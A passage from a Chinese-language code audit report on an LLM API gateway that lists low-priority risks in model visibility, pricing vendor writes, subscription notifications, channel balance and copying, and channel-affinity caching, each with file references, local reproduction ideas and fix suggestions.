  - `controller/model.go:208-279`：`ListModels` 会按 token group、auto group 和 token model limit 过滤列表
  - `controller/model.go:339-363`：`RetrieveModel` 只按 `openAIModelsMap[modelId]` 返回模型或 `model_not_found`，没有复用 `ListModels` 的可见性判断
  - `middleware/distributor.go:57-77`：正式 relay 请求仍会执行 token 模型限制，是正向对比
- 可能后果：受限 token 虽然不能真正调用未授权模型，但仍可通过单模型查询探测静态模型是否存在，第三方客户端也可能把查询成功误判为可调用。对按 token 做模型白名单、客户隔离或灰度开放的运营场景，这会造成权限提示不一致和轻量信息泄露。
- 复现思路：创建只允许 `gpt-4o-mini` 的 token；调用 `/v1/models` 确认列表只返回允许模型；再调用 `/v1/models/gpt-4o` 或其他静态存在但未授权的模型，观察 `RetrieveModel` 是否仍返回模型对象。随后真实调用该模型应被 `Distribute` 拦截，形成“可查询但不可用”的不一致。
- 修复建议：`RetrieveModel` 应复用 `getModelListGroups` 和 token model limit 判断；未授权模型返回与不存在模型一致的 `model_not_found` 或明确 `model_not_authorized`。`/v1/engines/:model`、Gemini retrieve 路由也应保持同一可见性语义。
- 优先级：P3
- 当前状态：已确认单模型查询没有可见性过滤，正式 relay 调用仍有拦截。

### 风险 223：公开 pricing 缓存重建会自动写入 vendor 表，供应商删除/改名又不检查引用或刷新缓存

- 标题：`/api/pricing` 这类读路径触发 `GetPricing/updatePricing` 时，`initDefaultVendorMapping` 会按模型名推断并创建 vendor；而供应商管理接口可删除/改名被模型引用的 vendor 且不刷新 pricing cache
- 影响范围：价格页供应商筛选、模型归属、供应商列表、Admin 模型表 vendor 过滤、公开 `/api/pricing` 读接口、副作用审计、默认 vendor 推断、软删除 vendor 后的模型 metadata
- 触发条件：站点存在 enabled abilities，但对应模型没有精确 metadata 或 metadata vendor_id 为 0；模型名命中默认供应商规则；pricing cache 过期或为空；任意用户/匿名访问价格页触发缓存重建；或 Admin 删除/改名仍被 models.vendor_id 引用的 vendor
- 涉及文件/函数：
  - `router/api-router.go:33` 与 `middleware/header_nav.go:104-122`：价格页模块开启且不要求登录时，`/api/pricing` 可由匿名请求触发 `GetPricing`
  - `controller/pricing.go:36-75`：`GetPricing` 调用 `model.GetPricing()`，随后返回 vendors、group ratio、supported endpoint 等价格页数据
  - `model/pricing.go:66-78`：`GetPricing` 在缓存过期或为空时调用 `updatePricing`
  - `model/pricing.go:170-181`：`updatePricing` 预加载现有 vendors 后调用 `initDefaultVendorMapping`
  - `model/pricing_default.go:70-95`：没有 metadata 的 enabled 模型会按 `defaultVendorRules` 推断 vendor，并把合成 metadata 放入 `metaMap`
  - `model/pricing_default.go:99-120`：`getOrCreateVendor` 找不到 vendor 时会 `newVendor.Insert()` 写入数据库；这是 pricing 读路径里的持久化副作用
  - `controller/vendor_meta.go:84-108`：`UpdateVendorMeta` 没有校验名称非空，更新成功后不调用 `model.RefreshPricing()`
  - `controller/vendor_meta.go:111-123`：`DeleteVendorMeta` 直接软删除 vendor，不检查 `models.vendor_id` 是否仍引用该 vendor，也不刷新 pricing cache
  - `model/pricing.go:181-189` 与 `web/default/src/features/pricing/hooks/use-pricing-data.ts:44-58`：前端只用 `/api/pricing` 返回的 vendors map 补 `vendor_name/vendor_icon`；被删除或缓存未刷新的 vendor 会让模型供应商展示和筛选不稳定
- 可能后果：一个本应只读的价格页访问会创建供应商行，且没有 Admin 操作人、变更原因或同步来源记录；公开访问量、缓存过期和默认规则会共同决定 vendor 表何时被写入。Admin 删除或改名仍被模型引用的 vendor 后，短期 pricing cache 仍可能显示旧供应商；缓存刷新后模型又可能变成无供应商或被默认推断重新创建类似 vendor，导致供应商筛选数量、模型归属和排名解释来回漂移。该问题不直接影响充值或扣费，但会削弱模型广场、供应商统计和运营审计的可信度。
- 复现思路：本地清空某个默认供应商 vendor，保留命中规则且无 metadata vendor 的 enabled ability；请求 `/api/pricing`，观察 vendor 表是否新增对应默认供应商。随后把一个被模型引用的 vendor 软删除或改名，立即请求 `/api/pricing` 与等待缓存刷新后再次请求，对比模型 `vendor_name` 和 vendors 列表是否漂移。只在本地测试库操作，不删除生产供应商。
- 修复建议：把默认 vendor 推断改为纯内存展示，不在 pricing 读路径写库；若需要落库，应放在显式 Admin 修复/同步任务中，提供 dry-run、操作者、来源和审计日志。供应商更新必须校验名称 trim 后非空，status 枚举合法；删除前检查被引用模型数量，默认阻止或要求迁移/解除引用。供应商 create/update/delete 后应调用 `model.RefreshPricing()`，并在响应中提示受影响模型数量。
- 优先级：P3
- 当前状态：已确认 pricing 缓存重建可写 vendor 表，供应商删除/更新缺少引用检查和 pricing cache 刷新；尚未修复。

### 风险 228：订阅低额度通知只看本次单条套餐且与钱包共用阈值/频控，多套餐和 source 场景下告警容易误导

- 标题：订阅低额度提醒使用当前请求绑定的单个 `SubscriptionId` 和用户通用 `QuotaWarningThreshold`，不计算用户所有 active 订阅总可用额度，也不区分付费/兑换/管理员赠送 source；钱包和订阅提醒还共用 `quota_exceed` 通知频控
- 影响范围：订阅低额度提醒、钱包余额提醒、多套餐用户、无限额度套餐、兑换码/管理员赠送套餐、客服工单、用户续费/充值引导和通知频率控制
- 触发条件：用户有多条 active 订阅；本次请求消耗的是一条即将用尽的小额套餐，但用户还有其他套餐或钱包余额；或用户同时触发钱包低额和订阅低额；或用户持有无限额度订阅；或免费/赠送/兑换 source 的套餐被消耗到阈值以下。
- 涉及文件/函数：
  - `service/billing.go:61-66`：结算后根据 `relayInfo.BillingSource` 二选一发送订阅额度通知或钱包额度通知，不会同时解释钱包和订阅的整体可用性。
  - `service/quota.go:452-492`：钱包通知使用同一个用户设置阈值 `QuotaWarningThreshold`，内容提示“您的额度即将用尽”。
  - `service/quota.go:500-542`：订阅通知只在 `SubscriptionId != 0` 且 `SubscriptionAmountTotal > 0` 时执行；无限额度套餐 `AmountTotal=0` 直接跳过；剩余额度只按 `SubscriptionAmountTotal - (SubscriptionAmountUsedAfterPreConsume + SubscriptionPostDelta)` 计算当前单条订阅。
  - `service/billing_session.go:317-335`：`syncRelayInfo` 只保存当前被扣的 `SubscriptionId/AmountTotal/AmountUsedAfterPreConsume/PlanId/PlanTitle`，没有用户所有 active 订阅总剩余、source 或备用资金源信息。
  - `service/user_notify.go:57-64` 与 `service/notify-limit.go:57-76`：通知频控使用 `data.Type`，钱包和订阅通知都传 `dto.NotifyTypeQuotaExceed`，因此同一用户每小时额度类通知共享同一个限额。
  - `controller/user.go:1153-1185` 与 `web/default/src/features/profile/components/tabs/notification-tab.tsx:162-177`：用户只配置一个“Quota Warning Threshold”，前端文案也是余额低于阈值提醒，没有订阅专用阈值、总套餐阈值或 source 阈值。
- 可能后果：用户还有其他付费套餐或钱包余额时，仍可能收到“订阅额度即将用尽”的提醒，误以为整体账户即将不可用；反过来，无限额度订阅完全不发提醒，运营无法通过通知提示免费/赠送无限套餐的高成本消耗。多条小额补偿套餐叠加时，系统按被选中的单条套餐反复触发低额提醒，但无法说明“是哪一个来源/计划/剩余多少总套餐额度”。钱包和订阅共用 `quota_exceed` 频控时，钱包低额提醒可能挤掉订阅提醒，或订阅提醒挤掉钱包提醒，客服看到用户投诉时难以解释为什么某类提醒漏发。
- 复现思路：本地为同一用户创建两条 finite active 订阅，一条剩余低于阈值、一条剩余较高；让 `PreConsumeUserSubscription` 选择低余额那条并完成请求，观察通知内容只显示当前单条套餐剩余，不包含其他套餐总剩余或 source。再触发钱包低额和订阅低额，观察两者都以 `quota_exceed` 进入同一通知限额。无限额度套餐可通过 `AmountTotal=0` 验证订阅通知直接跳过。
- 修复建议：把钱包和订阅提醒拆成独立事件类型与阈值，例如 `wallet_quota_low`、`subscription_quota_low`、`subscription_source_budget_low`；订阅提醒应带 `subscription_id/plan/source/remaining/total`，并额外计算用户所有 active finite 订阅的总剩余和钱包可用性。无限额度套餐不应简单跳过，应支持按实际累计消耗、source 成本预算或高成本模型阈值提醒。通知频控 key 应区分钱包、订阅、source 和计划，避免互相挤占；前端文案应明确是“钱包余额”还是“当前套餐额度”。
- 优先级：P3
- 当前状态：已确认订阅低额度通知为单条套餐口径且与钱包共用阈值/频控；尚未修复。

### 风险 229：用户可见订阅列表排序和字段不反映真实扣费选择，多个套餐时容易产生账单争议

- 标题：用户订阅列表按 `end_time desc, id desc` 展示每条套餐剩余额度，但真实订阅预扣按 `end_time asc, id asc` 选择单条可扣套餐；前端没有标记下一次优先消耗哪条，也没有向用户展示套餐 source
- 影响范围：钱包页订阅列表、用户自助余额理解、多套餐叠加、兑换码/管理员补偿套餐、订阅优先/订阅专用计费偏好、客服对账和低额度提醒解释
- 触发条件：用户同时拥有多条 active 订阅，尤其是不同到期时间、不同 source、不同有限额度或包含无限额度的组合；用户在钱包页查看“我的订阅”和剩余额度后发起模型或任务请求；真实扣费选择与用户视觉上看到的第一条、最大剩余额度或最新套餐不一致。
- 涉及文件/函数：
  - `model/subscription.go:771-784`：`GetAllActiveUserSubscriptions` 给用户自助接口返回 active 订阅时按 `end_time desc, id desc` 排序。
  - `model/subscription.go:803-815`：`GetAllUserSubscriptions` 返回包含历史记录的列表，同样按 `end_time desc, id desc` 排序。
  - `controller/subscription.go:48-68`：`/api/subscription/self` 同时返回 `subscriptions` 和 `all_subscriptions`，没有返回扣费优先级、下一条将被消耗的 subscription id、合计 finite 剩余额度或 source 摘要。
  - `model/subscription.go:1110-1114`：真实预扣选择 active 订阅时按 `end_time asc, id asc` 排序，和列表展示顺序相反。
  - `web/default/src/features/wallet/components/subscription-plans-card.tsx:420-528`：钱包页逐条展示套餐标题、状态、到期时间、下一次重置、已用/总额/剩余和进度条；没有展示 source，也没有“当前扣费优先级/下一次将优先使用”的标记。
  - `web/default/src/features/subscriptions/types.ts:62-73`：用户订阅类型虽然包含 `source`，但钱包页用户列表没有渲染该字段；管理员用户订阅对话框才展示 source。
- 可能后果：用户看到列表顶部是较新的、剩余额度高的套餐，实际请求却优先扣即将到期的另一条套餐；用户看到多条有限订阅合计足够，实际因为风险 227 不能合并而回退钱包或失败；用户通过兑换码或客服补偿获得的套餐和付费套餐混在一起时，用户无法判断哪条会被消耗。发生低额度通知或钱包被扣时，用户和客服都需要反查日志/数据库才能解释“为什么扣的是这一条”，争议处理成本上升。
- 复现思路：本地为同一用户创建两条 active 订阅：A 将较早到期且剩余额度较低，B 较晚到期且剩余额度较高。打开钱包页，列表按较晚到期的 B 排在前面；随后发起一次 A 可覆盖的请求，观察 `PreConsumeUserSubscription` 会按 `end_time asc` 消耗 A。再把 A 改为管理员赠送或兑换码来源，确认普通用户列表是否看不到 source。
- 修复建议：`/api/subscription/self` 增加明确的消费视图字段，例如 `billing_order_rank`、`next_billing_candidate=true`、`finite_remaining_total`、`eligible_for_current_policy`、`source` 和 `source_label`；前端列表按真实扣费顺序或提供“展示顺序/扣费顺序”切换，并在订阅偏好旁提示 `subscription_first/subscription_only` 的真实回退行为。多套餐合并扣费修复前，应明确标注“单次请求必须由单个套餐覆盖”，避免用户把多条剩余额度相加理解为单次可用额度。
- 优先级：P3
- 当前状态：已确认用户列表展示顺序与真实预扣选择顺序相反，且普通用户视图不展示 source/扣费优先级；尚未修复。

### 风险 233：渠道余额只有当前值没有可信状态，误写 0 后运营无法区分真实欠费、查询失败和订阅资产不可见

- 标题：渠道表只保存 `balance` 和 `balance_updated_time`，余额查询成功、查询失败、错误体零值、订阅资产不可见和真实欠费都没有独立状态；手动启用/批量启用只改 channel status，不重查余额或保留上次可信余额
- 影响范围：渠道余额展示、自动禁用恢复、手动启用、按 tag 批量启用、全量余额更新、Root 通知、客服/运营事故复盘和上游账单核对
- 触发条件：某个渠道余额被风险 44/123/231/232 的异常口径写成 0 或负数；该渠道被全量/定时余额同步自动禁用，或管理员手动查询后看到 0 余额；运营随后通过单渠道启用、表格状态切换或按 tag 批量启用恢复渠道。
- 涉及文件/函数：
  - `model/channel.go:23-48`：`Channel` 只有 `Balance`、`BalanceUpdatedTime`、`Status`、`OtherInfo` 等当前态字段，没有 `last_trusted_balance`、`balance_status`、`balance_source`、`balance_error`、`balance_checked_at` 或 `balance_trust_level`。
  - `model/channel.go:585-589`：`UpdateBalance` 直接覆盖 `balance` 和 `balance_updated_time`，不保留旧值、不记录 provider 响应类型、不区分明确欠费与查询失败。
  - `service/channel.go:19-33`：自动禁用只把 reason 写成调用方传入的字符串，例如余额路径的“余额不足”，不会携带余额查询的原始语义或上次可信余额。
  - `controller/channel-billing.go:470-477`：全量余额更新只要 `err == nil && balance <= 0` 就禁用，禁用原因固定为“余额不足”。
  - `web/default/src/features/channels/lib/channel-actions.ts:62-118`：前端状态切换只调用 `updateChannel(id, { status })`；启用自动禁用渠道时不要求先重新查询余额、运行测试或确认禁用原因。
  - `controller/channel.go:863-990` 与 `model/channel.go:526-572`：`UpdateChannel` 最终按提交字段更新渠道并重建缓存/abilities；启用动作没有专门的恢复流程或余额可信度校验。
  - `controller/channel.go:753-773` 与 `model/channel.go:781-787`：按 tag 批量启用只把同 tag 渠道状态改为 enabled 并更新 abilities，不处理余额、禁用原因或恢复证据。
  - `web/default/src/features/channels/components/channels-columns.tsx:287-343`：余额列展示当前余额并允许点击更新；`channels-columns.tsx:766-790` 仅在自动禁用状态 tooltip 中展示 `status_reason/status_time`，没有展示余额是否来自失败查询或上次可信值。
- 可能后果：一次错误体零值或订阅资产不可见导致渠道余额写成 0 后，运营看到的现场只像“余额耗尽”，无法知道这次 0 是真实供应商欠费、billing 查询失败、单位错误、订阅资产没有被接口表达，还是上游返回了 200 错误体。手动启用可以让渠道重新参与路由，但余额仍保留错误的 0，下一次全量余额更新可能再次禁用；按 tag 批量启用还可能把一批真实欠费和误禁用渠道一起恢复。事故复盘时，`balance_updated_time` 和 `status_reason=余额不足` 不能说明余额来源，客服/运营需要翻系统日志或重查上游账单，且上次可信余额已经被覆盖。
- 复现思路：本地让某 OpenAI/Custom 渠道余额同步得到 0，并通过全量更新触发自动禁用；查看渠道表和前端，只能看到当前余额 0、更新时间和“余额不足”原因。随后在前端点击启用或调用 `PUT /api/channel/` 提交 `status=1`，观察状态恢复但余额仍是 0，且没有字段指示这次恢复是否重新验证过上游余额。按 tag 批量启用可验证同样没有逐渠道余额复核。
- 修复建议：把余额查询结果拆成可信状态机：`balance_value`、`last_trusted_balance`、`balance_status=trusted|untrusted|query_failed|explicit_depleted`、`balance_source`、`balance_error_type`、`balance_checked_at`、`balance_confirmed_at`。明确欠费才能触发“余额不足”自动禁用；错误体、单位不明、订阅资产不可见和超时应保留上次可信余额并标记为查询失败。手动启用自动禁用渠道时，应展示禁用原因、当前余额状态和上次可信余额，并提供“重新查询余额/测试连接/强制启用并记录原因”三种不同操作。按 tag 批量启用应输出逐渠道恢复结果和风险提示，避免混合恢复真实欠费渠道。
- 优先级：P3
- 当前状态：已确认渠道余额缺少可信状态和上次可信值，恢复动作不会复核余额来源；尚未修复。

### 风险 235：复制渠道会浅拷贝状态和证据字段，可能复制旧禁用原因、余额时间或重复累计成本

- 标题：`CopyChannel` 直接 `clone := *origin` 浅拷贝原渠道；默认只重置 `balance/used_quota`，不会重置 `status/other_info/balance_updated_time/tag/ChannelInfo` 等运营证据字段；如果关闭 `reset_balance`，还会把原渠道余额和累计用量复制到新渠道
- 影响范围：渠道复制、渠道成本统计、余额快照、自动禁用原因、tag 聚合、渠道身份追溯、多 key 状态、运营复制故障渠道或批量克隆相似渠道的流程
- 触发条件：管理员复制一个已经产生用量、余额查询、自动禁用、手动禁用或多 key 状态的渠道；或在复制弹窗取消勾选“Reset balance and used quota”；复制后的渠道继续使用相同 key、相同 tag 或相同 provider 配置。
- 涉及文件/函数：
  - `controller/channel.go:1179-1184`：复制接口支持 `reset_balance`，默认 true，但允许请求方关闭。
  - `controller/channel.go:1208-1218`：复制时 `clone := *origin`，随后只改 `Id/CreatedTime/Name/TestTime/ResponseTime`，并在 `resetBalance` 为 true 时清 `Balance/UsedQuota`；没有清理 `Status`、`OtherInfo`、`BalanceUpdatedTime`、`Tag`、`ChannelInfo`、`OtherSettings`、`BaseURL` 或多 key 禁用信息。
  - `web/default/src/features/channels/components/dialogs/copy-channel-dialog.tsx:50-70` 与 `:102-111`：前端提供“Reset balance and used quota”复选框，默认选中，但运营可以取消。
  - `web/default/src/features/channels/api.ts:229-237`：复制参数通过 query 传给后端，没有额外恢复/证据字段选择。
  - `model/channel.go:516-523`：复制后直接 `Insert` 并重建 abilities，使用 clone 上保留下来的状态字段。
  - `web/default/src/features/channels/lib/channel-utils.ts:559-560`：tag 行会合计子渠道 `used_quota`；如果复制时保留用量且 tag 相同，tag 聚合会立刻重复计算历史成本。
  - `model/channel.go:781-835` 与 `controller/channel.go:730-825`：按 tag 启停/编辑只批量改状态或配置，不会校正复制带来的旧余额、旧禁用原因或重复 used quota。
- 可能后果：复制一个自动禁用渠道时，新渠道可能一创建就继承 auto-disabled/manual-disabled 状态和旧 `status_reason/status_time`，看起来像新渠道刚发生同样故障；即使默认清空余额和用量，`balance_updated_time` 仍可能指向原渠道旧查询时间，造成“余额 0 但更新时间很早/很晚”的混乱现场。若运营取消重置余额和 used quota，新渠道会带着原渠道累计成本进入列表，tag 聚合会把历史 used quota 计算两遍；如果复制后仍使用同一个上游 key，还会让“一个 key 的历史成本”分裂成两个 channel id。多 key 渠道复制还可能继承旧 `MultiKeyStatusList/MultiKeyDisabledReason`，使新 key 池带着原渠道 key index 的封禁记录。
- 复现思路：本地创建一个渠道，更新余额、产生一次 used quota，并写入自动禁用状态/`other_info.status_reason`。复制该渠道两次：一次保持默认 reset，一次传 `reset_balance=false`。观察新渠道的 `status/other_info/balance_updated_time/tag/channel_info` 是否继承原值；第二个副本的 `balance/used_quota` 是否也继承。把三者放在同一 tag 下，检查 tag 聚合 used quota 是否重复放大。
- 修复建议：复制渠道应把“运营身份字段”和“运行时证据字段”分开处理。默认新副本应重置 `status=enabled` 或让运营明确选择状态，清空 `other_info.status_reason/status_time`、`balance_updated_time`、多 key 禁用记录和能力异常现场；`balance/used_quota` 不应允许普通复制直接继承，若确实要迁移历史成本，应走单独的“迁移/拆分渠道”流程并写审计日志。复制弹窗应明确提示复制的是 key/config 还是连同运营证据一起复制；tag 聚合应能标记克隆关系，避免把同一上游 key 的旧成本当成两个独立渠道成本。
- 优先级：P3
- 当前状态：已确认复制渠道为浅拷贝，默认只清余额/用量，不清状态原因和余额时间；`reset_balance=false` 会复制余额和累计用量；尚未修复。

### 风险 242：channel affinity 上游缓存命中统计只按 8 位 fingerprint 聚合且 Redis 累计非原子，容易误导运营判断缓存收益和渠道归因

- 标题：affinity usage cache stats 的 key 只有 `rule_name + using_group + key_fp`，`key_fp` 又是 SHA1 前 8 位；统计不包含 model、channel id、selected_group、user/token 或 relay attempt，并且每次累计使用 `Get -> 修改 -> SetWithTTL`，Redis 多实例并发下会丢增量
- 影响范围：Admin usage logs 的 affinity 星标弹窗、Codex/Claude 上游缓存收益评估、prompt cache 命中率、按渠道/模型排障、运营决定是否保留 affinity、Redis 多实例统计一致性、客户会话级故障定位
- 触发条件：多个用户或租户使用相同或碰撞的 `prompt_cache_key` fingerprint；同一 key 在不同模型、渠道、auto group 子分组之间复用；多实例同时处理相同 affinity key；高并发流式请求在结算时同时写 stats；运营从消费日志打开“渠道亲和性：上游缓存命中”弹窗判断缓存效果。
- 涉及文件/函数：
  - `service/channel_affinity.go:413-421`：`affinityFingerprint` 只取 SHA1 前 8 位，约 32 bit；这足以做日志提示，但不适合作为唯一统计聚合键。
  - `service/channel_affinity.go:387-410`：`GetChannelAffinityStatsContext` 只返回 rule、using group、key fingerprint 和 TTL，没有 channel id、selected group、model、user/token 或 request path。
  - `service/channel_affinity.go:758-795`：`GetChannelAffinityUsageCacheStats` 只按 rule/group/key_fp 查询并返回累计值，无法区分统计来自哪个模型或渠道。
  - `service/channel_affinity.go:798-845`：累计逻辑先 `cache.Get(entryKey)`，本地修改 `next`，再 `SetWithTTL`；进程内只用 64 个本地 mutex，Redis 模式下不同实例之间没有 Lua/HINCRBY/事务，最后写入者会覆盖并发增量。
  - `service/channel_affinity.go:871-879`：`channelAffinityUsageCacheEntryKey` 使用换行拼接 rule/group/key_fp；没有额外维度，也没有把完整 hash 放入 key。
  - `service/channel_affinity.go:881-897`：命中判定只看 `cached_tokens` 或 `prompt_cache_hit_tokens` 是否大于 0；这是上游 usage 信号，不代表本次一定命中了 affinity 缓存选出的同一渠道。
  - `service/text_quota.go:374-383`：只有成功结算且存在 usage 时才调用 `ObserveChannelAffinityUsageCacheByRelayFormat`；失败、无 usage、0 usage 免费结算和部分本地估算不会完整进入该统计。
  - `controller/channel_affinity_cache.go:62-87` 与 `router/api-router.go:316`：Admin usage stats 查询只要求 `rule_name` 和 `key_fp`，后端按上述聚合口径返回。
  - `web/default/src/features/usage-logs/components/columns/common-logs-columns.tsx:417-433`：default 前端从某条日志的 `channel_affinity` 中取 rule/group/key_hint/key_fp 打开 stats 弹窗；同一个短 fingerprint 的其它 key 或其它渠道统计会被一起展示。
  - `web/classic/src/components/table/usage-logs/modals/ChannelAffinityUsageCacheModal.jsx:125-189`：classic 弹窗展示命中率、cached tokens、prompt tokens 等累计值，并把说明写成 usage 中存在 cached tokens 即视为命中。
- 可能后果：运营看到某条 Codex 会话的 affinity 弹窗显示高命中率，可能以为该 prompt/session 在当前渠道上稳定命中上游缓存，但实际统计可能混合了同 fingerprint 的其它 key、其它模型、其它渠道或其它实例的部分增量；反过来，Redis 并发覆盖会把真实 hit/total 低估，误判 affinity 无效。8 位 fingerprint 在高基数 key 下存在碰撞概率，碰撞后 UI 仍显示当前日志的 `key_hint`，但后端返回的是碰撞聚合值，容易把一个租户/会话的缓存收益归因到另一个租户/会话。由于 stats 不含 channel id，前两轮提到的 stale affinity、skip retry 和坏渠道场景也无法通过该弹窗直接看出“命中的是哪个渠道、是否已经自动禁用、是否发生过 fallback”。这不是余额/充值漏洞，但会削弱运营对高成本 Codex affinity 策略的观测能力，导致错误保留、错误关闭或错误排查。
- 复现思路：本地构造两个不同 affinity value，使它们手工写入相同短 `key_fp` 的测试 context，分别用不同 model/channel 记录 cached token usage；从任一日志的 key_fp 查询 stats，观察返回值合并。多实例复现可让两个进程同时对同一 rule/group/key_fp 调 `ObserveChannelAffinityUsageCacheByRelayFormat`，检查 Redis 中最终 total 是否小于请求次数。不要在生产日志中枚举或反推真实用户 key。
- 修复建议：stats 聚合键至少使用完整不可逆 hash，例如 SHA256 前 16-32 字节，并把 model、selected channel id、selected group、relay format 和是否 affinity cache hit 纳入维度；短 `key_fp` 只作为 UI 摘要，不作为唯一查询键。Redis 统计使用 Lua 脚本、HINCRBY 或 Redis hash 原子累计，并保留窗口开始/结束时间而不是每次 `SetWithTTL` 延长 TTL。弹窗应明确显示统计口径、样本数、维度和数据延迟；当 fingerprint 碰撞风险或样本维度不完整时，只展示“上游 usage 中含 cached tokens”，不要把它命名为确定的 affinity 命中率。失败/无 usage/本地估算应有单独计数，方便判断“没有命中”还是“没有统计”。
- 优先级：P3
- 当前状态：已确认 usage cache stats 仅按短 fingerprint 聚合，Redis 模式没有跨实例原子累计；尚未修复。

### 风险 247：关闭 `SwitchOnSuccess` 后，自定义 affinity 规则一旦允许失败重试，最终成功响应会把失败的初始渠道写回 affinity cache

- 标题：`RecordChannelAffinity` 的入参来自外层 distributor 最初选中的 `channel.Id`；只有 `SwitchOnSuccess=true` 时才会改用当前 context 中 retry 后的成功 `channel_id`。如果 Root 关闭 `SwitchOnSuccess`，且自定义规则 `skip_retry_on_failure=false` 允许失败后 fallback 成功，系统会把同一个 affinity key 重新写到失败的初始渠道。
- 影响范围：自定义 channel affinity 规则、非默认 Codex/Claude 模板、允许重试的高成本模型、备用渠道 fallback、上游 429/5xx/连接错误、局部坏渠道粘性、cache stats 和客服排障。
- 触发条件：Root 启用 channel affinity；新增或编辑自定义规则，`skip_retry_on_failure=false`；全局 `channel_affinity_setting.switch_on_success=false`；初始 affinity 命中或 cache miss 后选中的渠道返回可重试错误；后续 retry 成功切到其它渠道；外层 response 状态小于 400。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:76-112`：内置 Codex/Claude 模板默认 `SwitchOnSuccess=true` 且 `SkipRetryOnFailure=true`，这是默认路径的正向边界；本风险依赖自定义配置或 Root 改动。
  - `web/default/src/features/system-settings/general/channel-affinity/rule-editor-dialog.tsx:115-127`：空白自定义规则的 `skip_retry_on_failure` 默认是 false，允许构造“affinity 但可重试”的规则。
  - `web/default/src/features/system-settings/general/channel-affinity/index.tsx:392-399`：前端把 `Switch affinity on success` 作为全局开关展示，说明 Root 可以关闭成功渠道回写。
  - `middleware/distributor.go:104-130`：初始请求会先按 affinity 或普通随机选择一个 `channel` 局部变量。
  - `middleware/distributor.go:160-165`：`c.Next()` 返回后，只要响应状态小于 400，就调用 `service.RecordChannelAffinity(c, channel.Id)`；这里传入的仍是 distributor 最初的 `channel.Id`，不会随 controller retry 更新。
  - `controller/relay.go:190-235`：普通 relay 出错后可以进入 retry 循环；如果 `shouldRetry` 允许，会继续尝试其它渠道。
  - `controller/relay.go:292-321`：retry 阶段调用 `CacheGetRandomSatisfiedChannel` 后会重新执行 `SetupContextForSelectedChannel`，覆盖 gin context 里的 `channel_id`、channel key、base_url 等当前成功渠道信息。
  - `service/channel_affinity.go:626-642`：只有当规则或上下文要求 skip retry 时才停止重试；自定义规则关闭 `skip_retry_on_failure` 后不会被这里阻断。
  - `service/channel_affinity.go:681-706`：`RecordChannelAffinity` 仅在 `SwitchOnSuccess=true` 时用 `c.GetInt("channel_id")` 覆盖入参；关闭后会使用外层传入的初始 channel id 写 cache。
  - `controller/relay.go:257-260` 与 `controller/relay.go:238-242`：系统只记录 `use_channel` 重试链路日志，不会阻止错误初始渠道被写回 affinity cache。
- 可能后果：Root 以为关闭 `SwitchOnSuccess` 只是“不让一次 fallback 改变原有粘性”，但在 cache miss 或初始坏渠道场景下，它会把失败的初始渠道作为本次成功结果写入 affinity cache。后续同一 `prompt_cache_key`、header key 或自定义 session key 会继续命中这个刚失败的渠道，再次触发 retry 或失败；如果同一渠道短时抖动、429 或上游账号限流，该 affinity key 会在 TTL 内反复回到问题渠道，削弱 fallback 的实际效果。运营看到最终请求成功和 retry 日志，可能误判 affinity 已被成功渠道修正；实际 cache value 仍是失败渠道，下一次同 key 请求又从坏渠道开始。这不会直接让用户充值或扣费，但会造成局部会话错误率、上游成本重复尝试、自动禁用噪声和缓存统计误导。
- 复现思路：本地配置两个同模型假渠道 A/B，A 第一次返回 500、B 返回 200；添加一条自定义 affinity 规则，key source 可用请求 header 或 JSON 字段，`skip_retry_on_failure=false`；关闭 `channel_affinity_setting.switch_on_success`。第一次请求带相同 affinity key，观察最终由 B 成功；随后检查 Redis/内存 affinity cache 是否写入 A 的 channel id。第二次同 key 请求应再次从 A 开始。复现只用本地假上游，不对真实 provider 制造错误。
- 修复建议：即使 `SwitchOnSuccess=false`，也不应在本次初始渠道失败且最终由其它渠道成功时写入失败渠道。可以把 `RecordChannelAffinity` 的默认入参改为“最终成功渠道”，并单独增加 `preserve_existing_affinity_on_retry` 语义：已有 cache 命中失败但 fallback 成功时选择是否保留旧值，cache miss 时永远写成功渠道。记录 affinity 时应带上 `initial_channel_id`、`final_channel_id`、`use_channel`、`retry_index` 和是否覆盖 cache；如果初始渠道失败，至少跳过写入并增加 `affinity_not_recorded_initial_failed` 指标。前端文案也应区分“成功后切换到最终渠道”和“保留已有 affinity”，避免关闭开关后产生失败渠道新写入。
- 优先级：P3
- 当前状态：已确认关闭 `SwitchOnSuccess` 时 `RecordChannelAffinity` 会使用外层初始 channel id；自定义规则关闭 skip retry 后存在最终成功但写回失败初始渠道的路径，尚未修复。

### 风险 250：affinity cache miss 首次请求可被 `SkipRetryOnFailure` 阻断重试，但错误日志不会标出 affinity 规则，Root 难以看出失败是 affinity 策略导致

- 标题：`GetPreferredChannelByAffinity` 在规则匹配且 cache miss 时已经把 affinity meta 写进 context；`ShouldSkipRetryAfterChannelAffinityFailure` 会用这份 meta 阻断 retry，但 `admin_info.channel_affinity` 只在 `MarkChannelAffinityUsed` 被调用后才写入日志上下文。cache miss 首次请求失败时没有 preferred channel 命中，也不会调用 `MarkChannelAffinityUsed`，因此错误日志看不到导致停止重试的 affinity rule/key。
- 影响范围：默认 Codex `/v1/responses`、Claude `/v1/messages`、自定义 gjson/header affinity 规则、cache miss 首次请求、preferred channel disabled、错误日志、自动禁用通知、Root 排障、客服解释和渠道冗余策略验证。
- 触发条件：channel affinity 开启；规则匹配请求并提取到 affinity value；cache miss 或 preferred channel disabled；规则 `SkipRetryOnFailure=true`；选中的普通渠道或 preferred channel 返回 429/5xx/网络错误/被禁用；Root 依赖错误日志或用量日志判断为什么没有 fallback。
- 涉及文件/函数：
  - `service/channel_affinity.go:550-621`：规则匹配并提取到 affinity value 后先 `setChannelAffinityContext`，即使 cache miss 返回 `found=false`，context 中仍保留 `SkipRetry`、rule name、key hint/fingerprint 等 meta。
  - `service/channel_affinity.go:626-642`：重试决策读取显式 flag；没有 flag 时回退读取 affinity meta，所以 cache miss 请求也会因 meta 中的 `SkipRetry=true` 停止重试。
  - `service/channel_affinity.go:644-668`：只有 `MarkChannelAffinityUsed` 会设置 `ginKeyChannelAffinityLogInfo`，即日志里实际使用的 `channel_affinity` 信息。
  - `middleware/distributor.go:104-130`：`MarkChannelAffinityUsed` 只在 preferred channel cache hit 且 channel/group/model 可用时调用；cache miss 后走普通随机选渠，不会调用它。
  - `controller/relay.go:324-330`：普通 relay 失败后第一优先级检查 `ShouldSkipRetryAfterChannelAffinityFailure`，命中后不再 fallback。
